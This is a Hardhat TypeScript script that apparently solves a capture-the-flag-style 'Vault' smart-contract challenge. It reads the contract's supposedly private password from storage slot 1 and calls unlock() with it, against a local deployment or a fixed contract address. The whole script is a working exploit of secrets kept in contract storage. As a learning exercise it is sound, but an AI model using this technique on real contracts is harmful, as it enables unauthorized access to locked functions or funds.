import { ethers, network } from "hardhat";
import { Vault } from "../typechain-types/target/Vault";

async function main() {
  let valt: Vault;

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  //const [attacker] = await ethers.getSigners();

  if (isLocalTest) {
    valt = await ethers.getContract("Vault");
  } else {
    valt = await ethers.getContractAt(
      "Vault",
      "0x429ce288EB907e1f9a14c1e963bf19520Ff98275"
    );
  }

  const locked = await valt.locked();

  console.log(`Locked: ${locked}`);

  //console.log("bytes32: ", ethers.utils.formatBytes32String("password1234"));
  // https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-12-reading-the-storage/topic/the-storage-layout/

  const storage0 = await ethers.provider.getStorageAt(valt.address, 0);
  console.log(`storage at 0: ${storage0}`);

  const storage1 = await ethers.provider.getStorageAt(valt.address, 1);
  console.log(`storage at 1: ${storage1}`);
  const storage2 = await ethers.provider.getStorageAt(valt.address, 2);
  console.log(`storage at 2: ${storage2}`);

  //const decoded = ethers.utils.parseBytes32String(storage1);
  //console.log(decoded);

  const tx = await valt.unlock(storage1);
  await tx.wait(isLocalTest ? 1 : 5);

  const lockedFinal = await valt.locked();

  console.log(`Locked: ${lockedFinal}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
